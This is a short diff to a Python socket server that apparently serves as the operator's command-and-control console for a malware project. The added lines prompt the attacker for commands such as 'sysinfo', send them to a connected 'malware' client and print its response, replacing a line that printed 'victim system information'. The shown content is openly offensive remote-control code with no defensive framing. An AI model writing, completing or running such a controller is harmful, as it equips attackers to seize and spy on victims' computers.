@@ -17,13 +17,20 @@ def my_client_handler(input_client_info):
     welcome_message += " " * (BUFFER_SIZE - len(welcome_message))
     connection.send(welcome_message.encode(CODING))
     while True:
+        attacker_message = input("Enter the command which you want to send to the malware (for example sysinfo): ")
+        attacker_message += " " * (BUFFER_SIZE - len(attacker_message))
+
+        attacker_message = attacker_message.encode(CODING)
+        attacker_message_size = len(attacker_message)
+        attacker_message_size = str(attacker_message_size)
+        attacker_message_size += " " * (BUFFER_SIZE - len(attacker_message_size))
+        attacker_message_size = attacker_message_size.encode(CODING)
+        connection.send(attacker_message_size)
+        connection.send(attacker_message)
+
         message_size = int(connection.recv(BUFFER_SIZE).decode(CODING))
         message = connection.recv(message_size).decode(CODING)
-        print("The victim system information is: \n" + message)
-
-
-
-
+        print("The malware response is: \n" + message)
 
 
 
